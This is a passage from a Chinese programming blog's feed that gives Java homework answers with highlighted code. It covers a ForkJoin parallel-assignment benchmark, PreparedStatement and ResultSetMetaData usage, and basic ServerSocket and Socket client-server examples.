        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">&lt;</span> <span class="token constant">THRESHOLD</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">ThreadLocalRandom</span><span class="token punctuation">.</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> middle <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
                <span class="token function">invokeAll</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AssignTask</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> start<span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">AssignTask</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> middle<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 并行赋值方法</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">parallelAssignValues</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ForkJoinPool</span> pool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pool<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AssignTask</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 顺序赋值方法</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sequentialAssignValues</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 测试方法</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token number">9000000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// 测试并行赋值</span>
        <span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">parallelAssignValues</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Parallel time: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ms"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 测试顺序赋值</span>
        startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sequentialAssignValues</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
        endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sequential time: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ms"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-14</title>
    <url>/2024/01/02/17-10-14/</url>
    <content><![CDATA[<p>java数据库操作、网络编程</p>
<span id="more"></span>
<h2 id="描述预备语句的概念-如何创建preparedstatement-的一个实例如何执行一个preparedstatement-对象如何在-preparedstatement-中设置参数值"><a class="markdownIt-Anchor" href="#描述预备语句的概念-如何创建preparedstatement-的一个实例如何执行一个preparedstatement-对象如何在-preparedstatement-中设置参数值"></a> 描述预备语句的概念。如何创建PreparedStatement 的一个实例?如何执行一个PreparedStatement 对象?如何在 PreparedStatement 中设置参数值?</h2>
<p>预备语句（PreparedStatement）是Java数据库编程中的一种机制，用于执行预定义的SQL语句，其中可能包含参数。它是Statement的子接口，提供了更好的性能和安全性，同时允许在SQL语句中插入参数，避免了SQL注入的风险。</p>
<p>要创建PreparedStatement的实例，通常需要使用Connection对象。以下是一个简单的步骤：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 假设已经有一个有效的Connection对象conn</span>
<span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM your_table WHERE column_name = ?"</span><span class="token punctuation">;</span>
<span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>执行PreparedStatement对象通常使用execute(), executeQuery(), 或 executeUpdate() 方法，具体取决于你执行的SQL语句类型。以下是一个例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 或者</span>
<span class="token keyword">int</span> rowsAffected <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在预备语句中设置参数值是通过调用setXXX()方法，其中XXX表示参数的数据类型。以下是一些常见的setXXX()方法和它们的用法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 假设第一个参数是字符串类型</span>
preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"example_value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 假设第二个参数是整数类型</span>
preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 假设第三个参数是日期类型</span>
preparedStatement<span class="token punctuation">.</span><span class="token function">setDate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span>Date</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token string">"2022-01-01"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这个例子中，数字表示参数的位置，即SQL语句中?的位置。注意，参数的索引是从1开始的。</p>
<h2 id="使用预备语句的好处是什么"><a class="markdownIt-Anchor" href="#使用预备语句的好处是什么"></a> 使用预备语句的好处是什么？</h2>
<ol>
<li>
<p><strong>SQL注入防护：</strong><br>
预备语句使用参数化查询，使得输入的数据不直接拼接到SQL语句中。这可以有效防止SQL注入攻击，因为用户提供的输入不会被解释为SQL代码，而只是作为参数传递。</p>
</li>
<li>
<p><strong>性能优化：</strong><br>
预备语句可以在数据库中被编译和优化一次，然后多次执行。这减少了数据库的工作量，提高了执行相似查询的效率。相比于普通的<code>Statement</code>，预备语句在多次执行相同的SQL语句时更为高效。</p>
</li>
<li>
<p><strong>可读性和维护性：</strong><br>
通过将SQL语句和参数分离，代码变得更加清晰和易于理解。维护人员可以更容易地理解查询的意图，而且在修改查询时也更容易避免错误。</p>
</li>
<li>
<p><strong>类型安全性：</strong><br>
预备语句提供了各种<code>setXXX()</code>方法，用于设置不同类型的参数。这确保了在运行时使用正确的数据类型，并减少了因为数据类型不匹配而引起的错误。</p>
</li>
<li>
<p><strong>可移植性：</strong><br>
由于预备语句使用占位符而不是具体的数值，它在不同的数据库系统中更容易移植。这意味着你可以在不同的数据库之间切换而不必修改SQL语句的结构。</p>
</li>
</ol>
<p>总体而言，预备语句是一种安全且高效的数据库访问方法，特别适用于需要执行多次相似查询的情况。</p>
<h2 id="resultsetmetadata的作用是什么描述resultsetmetadata中的方法-如何获得-result-setmetadata的一个实例"><a class="markdownIt-Anchor" href="#resultsetmetadata的作用是什么描述resultsetmetadata中的方法-如何获得-result-setmetadata的一个实例"></a> ResultSetMetaData的作用是什么?描述ResultSetMetaData中的方法。如何获得 Result-SetMetaData的一个实例?</h2>
<p>ResultSetMetaData 是用于获取关于 ResultSet 中列的元数据（metadata）的接口。元数据是描述数据的数据，因此 ResultSetMetaData 提供了有关查询结果集中列的信息，如列的名称、数据类型、是否允许为 null 等。</p>
<p>以下是一些 ResultSetMetaData 接口中常用的方法：</p>
<ol>
<li><code>getColumnCount()</code>:返回结果集中的列数。</li>
<li><code>getColumnName(int column)</code>:返回指定列的名称。</li>
<li><code>getColumnLabel(int column)</code>:返回指定列的标签。通常，如果有别名，这个方法返回别名。</li>
<li><code>getColumnType(int column)</code>:返回指定列的 SQL 类型。</li>
<li><code>getColumnTypeName(int column)</code>:返回指定列的 SQL 类型名称。</li>
<li><code>isNullable(int column)</code>:返回指定列是否允许包含 NULL 值。</li>
<li><code>isAutoIncrement(int column)</code>:返回指定列是否是自增列。</li>
<li><code>isReadOnly(int column)</code>:返回指定列是否是只读的。</li>
<li><code>isSearchable(int column)</code>:返回指定列是否可用于搜索。</li>
</ol>
<p>要获得 ResultSetMetaData 的实例，可以使用 getMetaData() 方法，该方法在 ResultSet 接口中定义。以下是一个简单的示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 假设 resultSet 是已经执行的查询结果集</span>
<span class="token class-name">ResultSetMetaData</span> metaData <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="如何在结果集中求得列的数目如何在结果集中求得列名"><a class="markdownIt-Anchor" href="#如何在结果集中求得列的数目如何在结果集中求得列名"></a> 如何在结果集中求得列的数目?如何在结果集中求得列名?</h2>
<p>使用 ResultSetMetaData 接口提供的getMetaData() 方法来获取结果集中列的数目和列名。以下是示例代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 假设 resultSet 是已经执行的查询结果集</span>
<span class="token class-name">ResultSetMetaData</span> metaData <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 获取列的数目</span>
<span class="token keyword">int</span> columnCount <span class="token operator">=</span> metaData<span class="token punctuation">.</span><span class="token function">getColumnCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Number of columns: "</span> <span class="token operator">+</span> columnCount<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上述代码中，getColumnCount() 方法返回结果集中的列数，这个值存储在 columnCount 变量中。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 假设 resultSet 是已经执行的查询结果集</span>
<span class="token class-name">ResultSetMetaData</span> metaData <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 遍历每一列并获取列名</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> metaData<span class="token punctuation">.</span><span class="token function">getColumnCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> columnName <span class="token operator">=</span> metaData<span class="token punctuation">.</span><span class="token function">getColumnName</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Column name for column "</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="如何创建服务器套接字什么端口号是可用的如果请求的端口号已经在使用会发生什么现象一个端口能与多个客户端连接吗"><a class="markdownIt-Anchor" href="#如何创建服务器套接字什么端口号是可用的如果请求的端口号已经在使用会发生什么现象一个端口能与多个客户端连接吗"></a> 如何创建服务器套接字?什么端口号是可用的?如果请求的端口号已经在使用，会发生什么现象?一个端口能与多个客户端连接吗?</h2>
<p>使用 <code>ServerSocket</code> 类来创建服务器套接字。以下是一些关于创建服务器套接字和端口的基本信息：</p>
<ul>
<li>创建服务器套接字：</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServerExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span> <span class="token comment">// 选择一个可用的端口号</span>
            <span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server is running on port "</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 这里可以处理客户端连接和通信</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>端口号的可用性：<br>
端口号范围是0到65535。0到1023是系统保留端口，一般情况下应该避免使用这些端口。在1024到49151之间是注册端口，可以用于一些常见的应用服务。49152到65535之间是动态或私有端口，通常由客户端程序使用。<br>
如果请求的端口号已经在使用，将会抛出 IOException，提示端口已被占用。在这种情况下，你可能需要选择一个不同的端口号或者关闭正在使用该端口的程序。</p>
</li>
<li>
<p>一个端口能与多个客户端连接吗？<br>
是的，一个端口是可以与多个客户端建立连接的。服务器套接字监听指定的端口，而每个客户端连接都会在不同的套接字上创建。服务器可以通过多线程、多进程或异步机制来处理多个客户端的连接请求。<br>
注意，服务器在接受连接时通常会创建一个新的套接字来处理每个客户端，以确保并行处理多个客户端的请求。<br>
总体而言，服务器套接字允许你建立一个网络服务，监听指定的端口，并处理来自多个客户端的连接请求。</p>
</li>
</ul>
<h2 id="数据是如何在客户端和服务器之间传输的"><a class="markdownIt-Anchor" href="#数据是如何在客户端和服务器之间传输的"></a> 数据是如何在客户端和服务器之间传输的?</h2>
<p>数据在客户端和服务器之间的传输通常使用网络通信协议来完成。最常见的协议之一是TCP（Transmission Control Protocol）和UDP（User Datagram Protocol）。</p>
<ul>
<li>
<p>TCP传输方式：</p>
<ol>
<li>建立连接：在TCP传输中，客户端和服务器首先要建立一个连接。这通过三次握手过程完成，其中包括客户端向服务器发送连接请求，服务器回应确认，并最终客户端发送最终确认。</li>
<li>数据传输：一旦建立连接，数据可以在客户端和服务器之间双向传输。TCP提供可靠的、面向连接的数据流，确保数据按照顺序到达且不丢失。</li>
<li>连接关闭：在完成数据传输后，客户端或服务器可以发送关闭连接的请求，通过四次挥手的过程来断开连接。</li>
</ol>
</li>
<li>
<p>UDP传输方式：</p>
<ol>
<li>无连接性：UDP是无连接的传输协议，不需要在传输前建立连接。每个数据包（Datagram）都是独立的，不依赖于之前或之后的数据包。</li>
<li>数据传输：数据被分割成小的数据包，每个数据包都包含目标地址和端口信息。这些数据包被发送到网络，并希望它们能够按照发送的顺序到达。</li>
<li>不可靠性：UDP不提供像TCP那样的可靠性，数据包可能会丢失或乱序。因此，应用程序需要处理这些情况。</li>
</ol>
</li>
<li>
<p>数据格式：<br>
在传输过程中，数据通常以二进制格式进行传输。对于文本数据，可以使用字符编码（如UTF-8）来进行转换。在Web开发中，常见的数据交换格式包括JSON和XML。</p>
</li>
<li>
<p>编程实现：<br>
在编程中，使用Socket API（如Java中的Socket和ServerSocket类）可以实现基于TCP或UDP的客户端和服务器通信。程序通过Socket建立连接，使用输入流和输出流来进行数据传输。</p>
</li>
</ul>
<h2 id="服务器怎样接收客户端的连接请求客户端如何连接到服务器"><a class="markdownIt-Anchor" href="#服务器怎样接收客户端的连接请求客户端如何连接到服务器"></a> 服务器怎样接收客户端的连接请求?客户端如何连接到服务器?</h2>
<p>在Java中，服务器通过使用 <code>ServerSocket</code> 类来接收客户端的连接请求。客户端通过 <code>Socket</code> 类来连接到服务器。以下是基本的步骤：<br>
服务器接收连接请求：<br>
创建ServerSocket对象：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在服务器端，创建一个 ServerSocket 对象并指定监听的端口号。这个对象用于监听客户端的连接请求。</p>
<p>等待连接请求：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Socket</span> clientSocket <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用 accept() 方法等待客户端的连接请求。当有客户端请求连接时，accept() 方法返回一个新的 Socket 对象，该对象用于和客户端进行通信。</p>
<ul>
<li>客户端连接到服务器：
<ol>
<li>
<p>创建Socket对象：</p>
   <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>serverAddress<span class="token punctuation">,</span> serverPort<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在客户端，创建一个 Socket 对象并指定服务器的地址和端口号。这个对象用于与服务器建立连接。</p>
</li>
<li>
<p>建立连接：上述代码中，Socket 对象会尝试连接到指定的服务器。如果服务器允许连接，Socket 对象会成功建立连接，否则会抛出异常。</p>
</li>
</ol>
</li>
</ul>
<p>示例代码：</p>
<ul>
<li>服务器端：</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServerExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span>
            <span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server is running on port "</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 等待客户端连接</span>
            <span class="token class-name">Socket</span> clientSocket <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Client connected: "</span> <span class="token operator">+</span> clientSocket<span class="token punctuation">.</span><span class="token function">getInetAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 在这里可以处理和客户端的通信</span>

            <span class="token comment">// 关闭连接</span>
            clientSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>客户端：</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClientExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> serverAddress <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> serverPort <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span>
            
            <span class="token comment">// 连接到服务器</span>
            <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>serverAddress<span class="token punctuation">,</span> serverPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connected to server: "</span> <span class="token operator">+</span> serverAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 在这里可以处理和服务器的通信</span>

            <span class="token comment">// 关闭连接</span>
            socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
